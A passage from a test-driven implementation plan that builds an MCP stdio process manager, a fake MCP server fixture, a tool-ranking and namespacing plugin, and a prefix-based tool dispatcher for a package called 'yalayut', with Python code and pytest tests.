- [ ] Commit: `feat(yalayut): api artifact plugin — namespaced tool payload + call_api execution`

---

## Task 9 — MCP stdio process manager

`mcp_manager.py` owns MCP server lifecycle: lazy on-demand start, JSON-RPC over
stdio, the 5s health probe, 60s re-probe, consecutive-fail restart/disable, and
idle shutdown. Backed by `yalayut_mcp_processes`. No server starts at boot.

**Files:**
- Create: `packages/yalayut/src/yalayut/mcp_manager.py`
- Create: `packages/yalayut/tests/fixtures/fake_mcp_server.py`
- Test: `packages/yalayut/tests/test_mcp_manager.py`

**Steps:**

- [ ] Create `packages/yalayut/tests/fixtures/fake_mcp_server.py` — a minimal
  stdio JSON-RPC MCP server used by integration tests:

```python
"""Minimal stdio JSON-RPC 2.0 server emulating an MCP server for tests.

Supports two methods:
  * ``tools/list`` -> returns two fake tools
  * ``tools/call``  -> echoes the call arguments

Reads one JSON object per line from stdin, writes one JSON object per line to
stdout. Exits on EOF. If argv contains ``--unhealthy`` it never answers
``tools/list`` (to exercise the health-probe failure path).
"""
import json
import sys

_TOOLS = [
    {"name": "echo", "description": "Echo back the given text",
     "inputSchema": {"type": "object", "properties": {"text": {"type": "string"}}}},
    {"name": "add", "description": "Add two integers a and b",
     "inputSchema": {"type": "object",
                     "properties": {"a": {"type": "integer"}, "b": {"type": "integer"}}}},
]


def main() -> None:
    unhealthy = "--unhealthy" in sys.argv
    for line in sys.stdin:
        line = line.strip()
        if not line:
            continue
        try:
            req = json.loads(line)
        except json.JSONDecodeError:
            continue
        method = req.get("method")
        req_id = req.get("id")
        if method == "tools/list":
            if unhealthy:
                continue  # never reply -> probe times out
            resp = {"jsonrpc": "2.0", "id": req_id, "result": {"tools": _TOOLS}}
        elif method == "tools/call":
            params = req.get("params") or {}
            resp = {"jsonrpc": "2.0", "id": req_id,
                    "result": {"content": [{"type": "text",
                                            "text": json.dumps(params)}]}}
        else:
            resp = {"jsonrpc": "2.0", "id": req_id,
                    "error": {"code": -32601, "message": "method not found"}}
        sys.stdout.write(json.dumps(resp) + "\n")
        sys.stdout.flush()


if __name__ == "__main__":
    main()
```

- [ ] Create `packages/yalayut/tests/test_mcp_manager.py`:

```python
"""yalayut.mcp_manager — start, health-probe, call, idle-shutdown."""
import sys
from pathlib import Path

import pytest

from yalayut.mcp_manager import McpManager

FAKE_SERVER = Path(__file__).parent / "fixtures" / "fake_mcp_server.py"


def _mcp_block(unhealthy=False):
    cmd = f"{sys.executable} {FAKE_SERVER}"
    if unhealthy:
        cmd += " --unhealthy"
    return {
        "transport": "stdio",
        "run_cmd": cmd,
        "env_required": [],
        "health_check": "list_tools",
        "idle_timeout_s": 300,
    }


@pytest.fixture
def manager(monkeypatch):
    mgr = McpManager()
    # Stub the DB persistence so tests run without a schema.
    procs = {}

    async def fake_record(artifact_id, **kw):
        procs.setdefault(artifact_id, {}).update(kw)

    async def fake_get(artifact_id):
        return procs.get(artifact_id)

    monkeypatch.setattr(mgr, "_persist_process", fake_record)
    monkeypatch.setattr(mgr, "_load_process", fake_get)
    return mgr


@pytest.mark.asyncio
async def test_start_and_health_probe_ok(manager):
    handle = await manager.ensure_running(artifact_id=31, mcp=_mcp_block())
    assert handle["health"] == "ready"
    assert handle["pid"] > 0
    await manager.shutdown(31)


@pytest.mark.asyncio
async def test_health_probe_failure_kills_process(manager):
    handle = await manager.ensure_running(artifact_id=32,
                                          mcp=_mcp_block(unhealthy=True))
    assert handle["health"] == "unhealthy"
    # Process must be killed; no leftover.
    assert manager.is_running(32) is False


@pytest.mark.asyncio
async def test_list_tools_returns_discovered(manager):
    await manager.ensure_running(artifact_id=33, mcp=_mcp_block())
    tools = await manager.list_tools(33)
    names = {t["name"] for t in tools}
    assert names == {"echo", "add"}
    await manager.shutdown(33)


@pytest.mark.asyncio
async def test_call_tool_echoes(manager):
    await manager.ensure_running(artifact_id=34, mcp=_mcp_block())
    res = await manager.call_tool(34, "echo", {"text": "hello"})
    assert res["ok"] is True
    assert "hello" in res["content"]
    await manager.shutdown(34)


@pytest.mark.asyncio
async def test_ensure_running_reuses_live_process(manager):
    h1 = await manager.ensure_running(artifact_id=35, mcp=_mcp_block())
    h2 = await manager.ensure_running(artifact_id=35, mcp=_mcp_block())
    assert h1["pid"] == h2["pid"]  # no second spawn
    await manager.shutdown(35)


@pytest.mark.asyncio
async def test_idle_shutdown_kills_stale(manager, monkeypatch):
    await manager.ensure_running(artifact_id=36, mcp=_mcp_block())
    # Force last_used into the distant past.
    manager._procs[36]["last_used"] = 0.0
    killed = await manager.sweep_idle(now=10_000_000.0)
    assert 36 in killed
    assert manager.is_running(36) is False
```

- [ ] Run it — expect FAIL:
  `timeout 60 pytest packages/yalayut/tests/test_mcp_manager.py -p no:cacheprovider`
  Expected: `ModuleNotFoundError`.

- [ ] Create `packages/yalayut/src/yalayut/mcp_manager.py`:

```python
"""yalayut.mcp_manager — MCP stdio server process lifecycle.

Owns the on-demand start, JSON-RPC-over-stdio transport, health probing, idle
shutdown, and consecutive-failure handling for ``artifact_type='mcp'``.

KutAI rule ``no_auto_connect``: no MCP server starts at boot. ``ensure_running``
is called only by the mcp plugin when intersect has matched an mcp artifact for
a task. v1 supports the ``stdio`` transport only (``sse`` / ``streamable_http``
are Phase 4 — see plan Task 14).

Process state is mirrored to ``yalayut_mcp_processes`` so ``/yalayut mcp status``
can report across restarts; the in-memory ``_procs`` map holds the live
stdin/stdout handles.
"""
from __future__ import annotations

import asyncio
import json
import time
from typing import Any

from src.infra.logging_config import get_logger
from yalayut.shell_safety import ShellSafetyError, tokenize_cmd

logger = get_logger("yalayut.mcp")

_PROBE_TIMEOUT_S = 5.0
_CALL_TIMEOUT_S = 30.0
_REPROBE_INTERVAL_S = 60.0
_MAX_FAILS_RESTART = 3
_MAX_FAILS_DISABLE = 5


class McpManager:
    """Manages live MCP stdio subprocesses keyed by artifact id."""

    def __init__(self) -> None:
        # artifact_id -> {proc, stdin, stdout, health, pid, last_used,
        #                 last_probe, fails, idle_timeout, lock, next_id}
        self._procs: dict[int, dict[str, Any]] = {}

    # ----- DB mirror (patched in tests) ------------------------------------

    async def _persist_process(self, artifact_id: int, **fields: Any) -> None:
        """Upsert one yalayut_mcp_processes row."""
        from datetime import datetime

        from src.infra.db import get_db

        db = await get_db()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cols = {
            "pid": fields.get("pid"),
            "port": fields.get("port"),
            "started_at": fields.get("started_at", now),
            "last_used_at": now,
            "idle_timeout_s": fields.get("idle_timeout_s", 300),
            "health": fields.get("health", "starting"),
            "last_probe_at": now,
            "consecutive_probe_fails": fields.get("consecutive_probe_fails", 0),
        }
        await db.execute(
            "INSERT INTO yalayut_mcp_processes "
            "(artifact_id, pid, port, started_at, last_used_at, idle_timeout_s, "
            " health, last_probe_at, consecutive_probe_fails) "
            "VALUES (:aid, :pid, :port, :started, :used, :idle, :health, "
            ":probe, :fails) "
            "ON CONFLICT(artifact_id) DO UPDATE SET "
            "pid=excluded.pid, port=excluded.port, last_used_at=excluded.last_used_at, "
            "health=excluded.health, last_probe_at=excluded.last_probe_at, "
            "consecutive_probe_fails=excluded.consecutive_probe_fails",
            {"aid": artifact_id, "pid": cols["pid"], "port": cols["port"],
             "started": cols["started_at"], "used": cols["last_used_at"],
             "idle": cols["idle_timeout_s"], "health": cols["health"],
             "probe": cols["last_probe_at"], "fails": cols["consecutive_probe_fails"]},
        )
        await db.commit()

    async def _load_process(self, artifact_id: int) -> dict[str, Any] | None:
        from src.infra.db import get_db

        db = await get_db()
        cur = await db.execute(
            "SELECT pid, port, health, last_probe_at, consecutive_probe_fails, "
            "idle_timeout_s FROM yalayut_mcp_processes WHERE artifact_id = ?",
            (artifact_id,),
        )
        row = await cur.fetchone()
        if row is None:
            return None
        return {"pid": row[0], "port": row[1], "health": row[2],
                "last_probe_at": row[3], "consecutive_probe_fails": row[4],
                "idle_timeout_s": row[5]}

    # ----- lifecycle -------------------------------------------------------

    def is_running(self, artifact_id: int) -> bool:
        entry = self._procs.get(artifact_id)
        if not entry:
            return False
        proc = entry.get("proc")
        return proc is not None and proc.returncode is None

    async def ensure_running(
        self, artifact_id: int, mcp: dict[str, Any]
    ) -> dict[str, Any]:
        """Start (or reuse) the MCP server for ``artifact_id``.

        ``mcp`` is the manifest's ``mcp:`` block. Returns a handle dict
        ``{"pid", "health", "artifact_id"}``. On health-probe failure the
        process is killed and ``health='unhealthy'`` returned.
        """
        if self.is_running(artifact_id):
            entry = self._procs[artifact_id]
            entry["last_used"] = time.time()
            return {"artifact_id": artifact_id, "pid": entry["pid"],
                    "health": entry["health"]}

        transport = (mcp.get("transport") or "stdio").lower()
        if transport != "stdio":
            logger.warning("non-stdio MCP transport unsupported in v1",
                            artifact_id=artifact_id, transport=transport)
            return {"artifact_id": artifact_id, "pid": None,
                    "health": "unhealthy"}

        run_cmd = mcp.get("run_cmd")
        if not run_cmd:
            return {"artifact_id": artifact_id, "pid": None, "health": "unhealthy"}
        try:
            argv = tokenize_cmd(run_cmd)
        except ShellSafetyError as e:
            logger.warning("MCP run_cmd untokenizable", err=str(e))
            return {"artifact_id": artifact_id, "pid": None, "health": "unhealthy"}

        try:
            proc = await asyncio.create_subprocess_exec(
                *argv,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
        except (FileNotFoundError, OSError) as e:
            logger.warning("MCP spawn failed", artifact_id=artifact_id, err=str(e))
            return {"artifact_id": artifact_id, "pid": None, "health": "unhealthy"}

        entry = {
            "proc": proc,
            "stdin": proc.stdin,
            "stdout": proc.stdout,
            "health": "starting",
            "pid": proc.pid,
            "last_used": time.time(),
            "last_probe": time.time(),
            "fails": 0,
            "idle_timeout": float(mcp.get("idle_timeout_s", 300)),
            "lock": asyncio.Lock(),
            "next_id": 1,
            "health_check": mcp.get("health_check", "list_tools"),
        }
        self._procs[artifact_id] = entry
        await self._persist_process(artifact_id, pid=proc.pid, health="starting",
                                    idle_timeout_s=entry["idle_timeout"])

        healthy = await self._probe(artifact_id)
        entry["health"] = "ready" if healthy else "unhealthy"
        await self._persist_process(artifact_id, pid=proc.pid,
                                    health=entry["health"])
        if not healthy:
            await self.shutdown(artifact_id)
            return {"artifact_id": artifact_id, "pid": None, "health": "unhealthy"}
        return {"artifact_id": artifact_id, "pid": proc.pid, "health": "ready"}

    async def _rpc(
        self, artifact_id: int, method: str, params: dict | None, timeout: float
    ) -> dict[str, Any]:
        """Send one JSON-RPC request, read one response line."""
        entry = self._procs.get(artifact_id)
        if not entry or entry["proc"].returncode is not None:
            raise RuntimeError(f"MCP {artifact_id} not running")
        async with entry["lock"]:
            req_id = entry["next_id"]
            entry["next_id"] += 1
            req = {"jsonrpc": "2.0", "id": req_id, "method": method,
                   "params": params or {}}
            entry["stdin"].write((json.dumps(req) + "\n").encode("utf-8"))
            await entry["stdin"].drain()
            line = await asyncio.wait_for(
                entry["stdout"].readline(), timeout=timeout
            )
        if not line:
            raise RuntimeError("MCP closed stdout")
        return json.loads(line.decode("utf-8"))

    async def _probe(self, artifact_id: int) -> bool:
        """Run the health-check call within the probe timeout."""
        entry = self._procs.get(artifact_id)
        if not entry:
            return False
        try:
            resp = await self._rpc(artifact_id, "tools/list", None,
                                    timeout=_PROBE_TIMEOUT_S)
        except (asyncio.TimeoutError, RuntimeError, json.JSONDecodeError) as e:
            logger.warning("MCP health probe failed",
                            artifact_id=artifact_id, err=str(e))
            entry["fails"] = entry.get("fails", 0) + 1
            entry["last_probe"] = time.time()
            return False
        entry["fails"] = 0
        entry["last_probe"] = time.time()
        return "result" in resp and "tools" in (resp.get("result") or {})

    async def list_tools(self, artifact_id: int) -> list[dict[str, Any]]:
        """Return the MCP server's advertised tool list (name/description/schema)."""
        resp = await self._rpc(artifact_id, "tools/list", None,
                               timeout=_PROBE_TIMEOUT_S)
        return (resp.get("result") or {}).get("tools") or []

    async def call_tool(
        self, artifact_id: int, tool_name: str, arguments: dict[str, Any]
    ) -> dict[str, Any]:
        """Call one tool on the MCP server. Returns {"ok", "content", "error"}."""
        entry = self._procs.get(artifact_id)
        if entry:
            entry["last_used"] = time.time()
        try:
            resp = await self._rpc(
                artifact_id, "tools/call",
                {"name": tool_name, "arguments": arguments},
                timeout=_CALL_TIMEOUT_S,
            )
        except Exception as e:
            return {"ok": False, "content": None, "error": str(e)}
        if "error" in resp:
            return {"ok": False, "content": None,
                    "error": str(resp["error"])}
        content_items = (resp.get("result") or {}).get("content") or []
        text = "".join(
            c.get("text", "") for c in content_items if isinstance(c, dict)
        )
        return {"ok": True, "content": text, "error": None}

    async def reprobe_if_due(self, artifact_id: int) -> None:
        """Re-run the health probe if 60s have elapsed; handle fail escalation."""
        entry = self._procs.get(artifact_id)
        if not entry or entry["proc"].returncode is not None:
            return
        if time.time() - entry["last_probe"] < _REPROBE_INTERVAL_S:
            return
        healthy = await self._probe(artifact_id)
        if healthy:
            entry["health"] = "ready"
        else:
            fails = entry.get("fails", 0)
            if fails >= _MAX_FAILS_DISABLE:
                logger.warning("MCP disabled after repeated probe fails",
                                artifact_id=artifact_id)
                await self.shutdown(artifact_id)
                await self._mark_artifact_disabled(artifact_id)
            elif fails >= _MAX_FAILS_RESTART:
                logger.info("MCP restart attempt", artifact_id=artifact_id)
                await self.shutdown(artifact_id)
        await self._persist_process(artifact_id, pid=entry.get("pid"),
                                    health=entry["health"],
                                    consecutive_probe_fails=entry.get("fails", 0))

    async def _mark_artifact_disabled(self, artifact_id: int) -> None:
        from src.infra.db import get_db

        db = await get_db()
        await db.execute(
            "UPDATE yalayut_index SET enabled = 0 WHERE id = ?", (artifact_id,)
        )
        await db.commit()

    async def sweep_idle(self, now: float | None = None) -> list[int]:
        """Kill MCP servers idle longer than their idle_timeout. Returns killed ids."""
        now = time.time() if now is None else now
        killed: list[int] = []
        for artifact_id, entry in list(self._procs.items()):
            if entry["proc"].returncode is not None:
                continue
            if now - entry["last_used"] >= entry["idle_timeout"]:
                await self.shutdown(artifact_id)
                killed.append(artifact_id)
        return killed

    async def shutdown(self, artifact_id: int) -> None:
        """Terminate an MCP server and drop its in-memory handle."""
        entry = self._procs.pop(artifact_id, None)
        if not entry:
            return
        proc = entry.get("proc")
        if proc is not None and proc.returncode is None:
            try:
                proc.kill()
            except ProcessLookupError:
                pass
            try:
                await asyncio.wait_for(proc.wait(), timeout=5.0)
            except asyncio.TimeoutError:
                pass
        from src.infra.db import get_db

        try:
            db = await get_db()
            await db.execute(
                "DELETE FROM yalayut_mcp_processes WHERE artifact_id = ?",
                (artifact_id,),
            )
            await db.commit()
        except Exception as e:
            logger.warning("mcp process row cleanup failed", err=str(e))

    def status(self) -> list[dict[str, Any]]:
        """In-memory snapshot for /yalayut mcp status."""
        out = []
        for artifact_id, entry in self._procs.items():
            out.append({
                "artifact_id": artifact_id,
                "pid": entry.get("pid"),
                "health": entry.get("health"),
                "last_probe": entry.get("last_probe"),
                "fails": entry.get("fails", 0),
            })
        return out


# Module-level singleton — there is exactly one MCP fleet per KutAI process.
_MANAGER = McpManager()


def get_manager() -> McpManager:
    return _MANAGER
```

- [ ] Run it — expect PASS:
  `timeout 60 pytest packages/yalayut/tests/test_mcp_manager.py -p no:cacheprovider`
  Expected: 6 passed.

- [ ] Commit: `feat(yalayut): MCP stdio process manager — lazy start, health-probe, idle-shutdown`

---

## Task 10 — `mcp` artifact plugin (tool budget + namespacing + execution)

The `mcp` AccessPlugin: discovers tools on first start, caches descriptions into
`yalayut_mcp_tools`, ranks them by similarity to step intent, applies the
≤3-per-server / ≤6-per-step budget, produces namespaced tool payloads, and
provides `execute_mcp_tool`.

**Files:**
- Create: `packages/yalayut/src/yalayut/plugins/mcp.py`
- Test: `packages/yalayut/tests/test_plugin_mcp.py`

**Steps:**

- [ ] Create `packages/yalayut/tests/test_plugin_mcp.py`:

```python
"""yalayut.plugins.mcp — discovery, budget cap, namespacing, execution."""
import sys
from pathlib import Path

import pytest

from yalayut.plugins.mcp import McpPlugin, execute_mcp_tool, rank_tools_by_intent

FAKE_SERVER = Path(__file__).parent / "fixtures" / "fake_mcp_server.py"


def _mcp_row(env_status="ready"):
    return {
        "id": 41,
        "artifact_type": "mcp",
        "name": "mcp-cloudflare",
        "env_status": env_status,
        "manifest": {
            "name": "mcp-cloudflare",
            "mcp": {
                "transport": "stdio",
                "run_cmd": f"{sys.executable} {FAKE_SERVER}",
                "env_required": [],
                "tools_discover": True,
                "idle_timeout_s": 300,
            },
        },
    }


def test_rank_tools_caps_to_k():
    tools = [
        {"name": "a", "description": "deploy a worker to cloudflare"},
        {"name": "b", "description": "list dns records"},
        {"name": "c", "description": "manage kv namespace"},
        {"name": "d", "description": "purge cache"},
    ]
    ranked = rank_tools_by_intent(tools, "deploy a worker", k=3)
    assert len(ranked) == 3
    assert ranked[0]["name"] == "a"  # best match first


def test_to_application_skips_when_env_missing():
    plugin = McpPlugin()
    app = plugin.to_application(_mcp_row(env_status="missing_CLOUDFLARE_API_TOKEN"),
                                task_ctx={})
    assert app["payload"]["tools"] == []
    assert app["payload"]["skipped_reason"] == "missing_CLOUDFLARE_API_TOKEN"


@pytest.mark.asyncio
async def test_to_application_async_discovers_and_namespaces(monkeypatch):
    plugin = McpPlugin()
    app = await plugin.to_application_async(
        _mcp_row(), task_ctx={"step_intent": "echo some text", "_confidence": 0.8}
    )
    tool_names = {t["tool_name"] for t in app["payload"]["tools"]}
    # Namespaced: mcp_cloudflare__<tool>, double underscore.
    assert "mcp_cloudflare__echo" in tool_names
    # Budget cap: fake server has 2 tools, K_mcp=3, so both survive.
    assert len(app["payload"]["tools"]) <= 3


@pytest.mark.asyncio
async def test_per_step_total_budget(monkeypatch):
    plugin = McpPlugin()
    # 3 mcp rows, each yields 2 tools = 6; cap K_mcp_total=6 keeps all 6;
    # a 4th would be trimmed. Verify the trimming helper.
    from yalayut.plugins.mcp import enforce_step_budget
    apps = [
        {"payload": {"tools": [{"tool_name": f"m{i}__t{j}", "_score": 0.9 - j * 0.1}
                               for j in range(3)]}}
        for i in range(3)
    ]
    trimmed = enforce_step_budget(apps, k_total=6)
    total = sum(len(a["payload"]["tools"]) for a in trimmed)
    assert total == 6


@pytest.mark.asyncio
async def test_execute_mcp_tool_round_trip():
    tool_spec = {
        "tool_name": "mcp_cloudflare__echo",
        "artifact_id": 44,
        "mcp_tool_name": "echo",
        "mcp": {"transport": "stdio",
                "run_cmd": f"{sys.executable} {FAKE_SERVER}",
                "env_required": [], "idle_timeout_s": 300},
    }
    res = await execute_mcp_tool(tool_spec, {"text": "ping"})
    assert res["ok"] is True
    assert "ping" in res["response"]
    # Cleanup.
    from yalayut.mcp_manager import get_manager
    await get_manager().shutdown(44)
```

- [ ] Run it — expect FAIL:
  `timeout 60 pytest packages/yalayut/tests/test_plugin_mcp.py -p no:cacheprovider`
  Expected: `ModuleNotFoundError`.

- [ ] Create `packages/yalayut/src/yalayut/plugins/mcp.py`:

```python
"""yalayut.plugins.mcp — AccessPlugin for the ``mcp`` artifact type.

An mcp artifact is exposed via the ``tool`` class. Unlike api, an MCP server's
tool list is discovered at runtime (``tools/list`` on first start). This plugin:

  * starts the server on demand via :mod:`yalayut.mcp_manager` (lazy — never at
    boot, satisfying KutAI's ``no_auto_connect`` rule);
  * caches discovered tool descriptions + schemas into ``yalayut_mcp_tools``;
  * ranks tools by embedding similarity to the step intent and applies the
    per-server budget cap (``K_mcp`` = 3);
  * the consumer (intersect) applies the per-step total cap (``K_mcp_total`` = 6)
    via :func:`enforce_step_budget`;
  * namespaces each tool ``<artifact_slug>__<tool>`` (double underscore);
  * ``execute_mcp_tool`` is the path an agent's tool-call reaches.
"""
from __future__ import annotations

import json
from datetime import datetime
from typing import Any

from src.infra.logging_config import get_logger

logger = get_logger("yalayut.plugin.mcp")

K_MCP_PER_SERVER = 3
K_MCP_PER_STEP = 6


def _slug(name: str) -> str:
    return name.replace("-", "_")


def _embed(text: str):
    """Embed text with the shared multilingual-e5-base model."""
    from src.memory.embeddings import embed_text

    return embed_text(text or "")


def _cosine(a, b) -> float:
    import math

    if not a or not b or len(a) != len(b):
        return 0.0
    dot = sum(x * y for x, y in zip(a, b))
    na = math.sqrt(sum(x * x for x in a))
    nb = math.sqrt(sum(y * y for y in b))
    if na == 0 or nb == 0:
        return 0.0
    return dot / (na * nb)


def rank_tools_by_intent(
    tools: list[dict[str, Any]], step_intent: str, k: int = K_MCP_PER_SERVER
) -> list[dict[str, Any]]:
    """Return the top-``k`` tools ranked by description-vs-intent similarity.

    Each returned tool dict gets a ``_score`` field. When ``step_intent`` is
    empty the original order is preserved (still capped to ``k``).
    """
    if not tools:
        return []
    if not step_intent:
        for t in tools:
            t.setdefault("_score", 0.0)
        return tools[:k]
    intent_vec = _embed(step_intent)
    scored = []
    for tool in tools:
        desc = tool.get("description") or tool.get("name") or ""
        score = _cosine(intent_vec, _embed(desc))
        tool["_score"] = score
        scored.append(tool)
    scored.sort(key=lambda t: t["_score"], reverse=True)
    return scored[:k]


def enforce_step_budget(
    apps: list[dict[str, Any]], k_total: int = K_MCP_PER_STEP
) -> list[dict[str, Any]]:
    """Trim a list of mcp SkillApplications so total tool count <= ``k_total``.

    Tools are pooled across servers, sorted by ``_score`` descending, and the
    top ``k_total`` kept; each app's ``payload['tools']`` is rewritten.
    """
    pooled: list[tuple[int, dict[str, Any]]] = []
    for app_idx, app in enumerate(apps):
        for tool in (app.get("payload") or {}).get("tools") or []:
            pooled.append((app_idx, tool))
    pooled.sort(key=lambda pair: pair[1].get("_score", 0.0), reverse=True)
    keep = pooled[:k_total]
    kept_by_app: dict[int, list[dict[str, Any]]] = {}
    for app_idx, tool in keep:
        kept_by_app.setdefault(app_idx, []).append(tool)
    for app_idx, app in enumerate(apps):
        app.setdefault("payload", {})["tools"] = kept_by_app.get(app_idx, [])
    return apps


async def _cache_mcp_tools(artifact_id: int, tools: list[dict[str, Any]]) -> None:
    """Persist discovered tool descriptions + schemas into yalayut_mcp_tools."""
    from src.infra.db import get_db

    db = await get_db()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    for tool in tools:
        name = tool.get("name")
        if not name:
            continue
        desc = tool.get("description") or ""
        try:
            emb = _embed(desc)
            emb_blob = json.dumps(emb).encode("utf-8")
        except Exception:
            emb_blob = None
        await db.execute(
            "INSERT INTO yalayut_mcp_tools "
            "(artifact_id, tool_name, description, description_embedding, "
            " input_schema_json, first_seen_at) "
            "VALUES (?, ?, ?, ?, ?, ?) "
            "ON CONFLICT(artifact_id, tool_name) DO UPDATE SET "
            "description=excluded.description, "
            "description_embedding=excluded.description_embedding, "
            "input_schema_json=excluded.input_schema_json",
            (artifact_id, name, desc, emb_blob,
             json.dumps(tool.get("inputSchema") or {}), now),
        )
    await db.commit()


class McpPlugin:
    """AccessPlugin for mcp artifacts."""

    artifact_type = "mcp"

    def to_application(
        self, row: dict[str, Any], task_ctx: dict[str, Any]
    ) -> dict[str, Any]:
        """Synchronous shell — returns empty tools unless env missing.

        Real tool discovery needs an async server start; intersect calls
        :meth:`to_application_async`. This sync form exists only so the plugin
        protocol's signature is satisfied and the env-missing short-circuit is
        cheap.
        """
        env_status = row.get("env_status", "ready")
        return {
            "artifact_id": row.get("id"),
            "name": row.get("name"),
            "exposure_class": "tool",
            "applies_to": "execution",
            "render": None,
            "payload": {
                "kind": "mcp",
                "tools": [],
                "skipped_reason": None if env_status == "ready" else env_status,
            },
            "confidence": float(task_ctx.get("_confidence", 0.0)),
        }

    async def to_application_async(
        self, row: dict[str, Any], task_ctx: dict[str, Any]
    ) -> dict[str, Any]:
        """Start the MCP server, discover + rank + namespace tools, build payload."""
        env_status = row.get("env_status", "ready")
        base = self.to_application(row, task_ctx)
        if env_status != "ready":
            return base

        manifest = row.get("manifest") or {}
        mcp = manifest.get("mcp") or {}
        artifact_id = row.get("id")
        slug = _slug(row.get("name") or manifest.get("name") or "mcp_unknown")

        from yalayut.mcp_manager import get_manager

        manager = get_manager()
        handle = await manager.ensure_running(artifact_id, mcp)
        if handle.get("health") != "ready":
            base["payload"]["skipped_reason"] = "mcp_unhealthy"
            return base

        try:
            discovered = await manager.list_tools(artifact_id)
        except Exception as e:
            logger.warning("mcp tool discovery failed",
                            artifact_id=artifact_id, err=str(e))
            base["payload"]["skipped_reason"] = "mcp_discovery_failed"
            return base

        await _cache_mcp_tools(artifact_id, discovered)
        step_intent = task_ctx.get("step_intent") or task_ctx.get("intent") or ""
        ranked = rank_tools_by_intent(discovered, step_intent, k=K_MCP_PER_SERVER)

        tools_payload = []
        for tool in ranked:
            tools_payload.append({
                "tool_name": f"{slug}__{tool['name']}",
                "artifact_id": artifact_id,
                "mcp_tool_name": tool["name"],
                "description": tool.get("description", ""),
                "input_schema": tool.get("inputSchema") or {},
                "mcp": mcp,
                "_score": tool.get("_score", 0.0),
            })
        base["payload"]["tools"] = tools_payload
        return base

    def bind_args(self, row: dict[str, Any], task_ctx: dict[str, Any]) -> dict | None:
        return None

    async def execute(
        self, row: dict[str, Any], task_ctx: dict[str, Any], inputs: dict[str, Any]
    ) -> dict[str, Any]:
        """Convenience execute of the first discovered tool (tests/CLI)."""
        app = await self.to_application_async(row, task_ctx)
        tools = app["payload"]["tools"]
        if not tools:
            return {"ok": False, "error": app["payload"].get("skipped_reason")
                    or "no mcp tools"}
        return await execute_mcp_tool(tools[0], inputs)


async def execute_mcp_tool(
    tool_spec: dict[str, Any], arguments: dict[str, Any]
) -> dict[str, Any]:
    """Execute an MCP tool-call. Reached when an agent calls ``mcp_<slug>__<tool>``.

    ``tool_spec`` is one entry from ``McpPlugin.to_application_async()`` tools.
    Ensures the server is running (lazy start), then forwards a ``tools/call``.
    Returns ``{"ok", "response", "error"}``.
    """
    from yalayut.mcp_manager import get_manager

    manager = get_manager()
    artifact_id = tool_spec.get("artifact_id")
    mcp = tool_spec.get("mcp") or {}
    mcp_tool = tool_spec.get("mcp_tool_name")
    if artifact_id is None or not mcp_tool:
        return {"ok": False, "response": None, "error": "bad mcp tool_spec"}

    handle = await manager.ensure_running(artifact_id, mcp)
    if handle.get("health") != "ready":
        return {"ok": False, "response": None, "error": "mcp server unhealthy"}

    res = await manager.call_tool(artifact_id, mcp_tool, arguments or {})
    return {
        "ok": res["ok"],
        "response": res.get("content") if res["ok"] else None,
        "error": res.get("error"),
    }
```

- [ ] Run it — expect PASS:
  `timeout 60 pytest packages/yalayut/tests/test_plugin_mcp.py -p no:cacheprovider`
  Expected: 5 passed.

- [ ] Commit: `feat(yalayut): mcp artifact plugin — tool discovery, budget cap, namespacing, execution`

---

## Task 11 — Tool-prefix dispatch for api/mcp tool-calls

When a coulson agent invokes a namespaced tool (`api_*__*` / `mcp_*__*`), the
call must route to `execute_api_tool` / `execute_mcp_tool`. A single dispatch
entrypoint `yalayut.dispatch_tool(tool_name, args, registry)` does the routing
by prefix; coulson's tool registry calls it.

**Files:**
- Modify: `packages/yalayut/src/yalayut/__init__.py`
- Test: `packages/yalayut/tests/test_tool_dispatch.py`

**Steps:**

- [ ] Create `packages/yalayut/tests/test_tool_dispatch.py`:

```python
"""yalayut.dispatch_tool — prefix routing for namespaced api/mcp tool-calls."""
import pytest

import yalayut


@pytest.mark.asyncio
async def test_dispatch_routes_api(monkeypatch):
    async def fake_api(tool_spec, params):
        return {"ok": True, "response": "api-ran", "error": None}

    monkeypatch.setattr("yalayut.plugins.api.execute_api_tool", fake_api)
    registry = {
        "api_coingecko__price": {"_yalayut_kind": "api",
                                 "tool_name": "api_coingecko__price"},
    }
    res = await yalayut.dispatch_tool("api_coingecko__price", {"ids": "btc"},
                                      registry)
    assert res["ok"] is True
    assert res["response"] == "api-ran"


@pytest.mark.asyncio
async def test_dispatch_routes_mcp(monkeypatch):
    async def fake_mcp(tool_spec, args):
        return {"ok": True, "response": "mcp-ran", "error": None}

    monkeypatch.setattr("yalayut.plugins.mcp.execute_mcp_tool", fake_mcp)
    registry = {
        "mcp_cloudflare__echo": {"_yalayut_kind": "mcp",
                                 "tool_name": "mcp_cloudflare__echo"},
    }
    res = await yalayut.dispatch_tool("mcp_cloudflare__echo", {"text": "x"},
                                      registry)
    assert res["ok"] is True
    assert res["response"] == "mcp-ran"


@pytest.mark.asyncio
async def test_dispatch_unknown_tool():
    res = await yalayut.dispatch_tool("not_a_yalayut_tool", {}, {})
    assert res["ok"] is False
    assert "unknown" in res["error"]
```

- [ ] Run it — expect FAIL:
  `timeout 60 pytest packages/yalayut/tests/test_tool_dispatch.py -p no:cacheprovider`
  Expected: `AttributeError: module 'yalayut' has no attribute 'dispatch_tool'`.

- [ ] Add `dispatch_tool` to `packages/yalayut/src/yalayut/__init__.py` (append
  after the `run_recipe` import):

```python
async def dispatch_tool(
    tool_name: str, args: dict, registry: dict
) -> dict:
    """Route a namespaced yalayut tool-call to its plugin executor.

    ``registry`` is coulson's per-task tool registry: a dict mapping tool name
    to the tool-spec produced by ``ApiPlugin.to_application`` /
    ``McpPlugin.to_application_async``. Each spec carries ``_yalayut_kind``
    ('api' | 'mcp'). Returns ``{"ok", "response", "error"}``.
    """
    spec = registry.get(tool_name)
    if spec is None:
        return {"ok": False, "response": None,
                "error": f"unknown yalayut tool: {tool_name}"}
    kind = spec.get("_yalayut_kind")
    if kind == "api" or tool_name.startswith("api_"):
        from yalayut.plugins.api import execute_api_tool
        return await execute_api_tool(spec, args)
    if kind == "mcp" or tool_name.startswith("mcp_"):
        from yalayut.plugins.mcp import execute_mcp_tool
        return await execute_mcp_tool(spec, args)
    return {"ok": False, "response": None,
            "error": f"tool {tool_name} has no yalayut kind"}
```

  Add `"dispatch_tool"` to `__all__` if present.

- [ ] Run it — expect PASS:
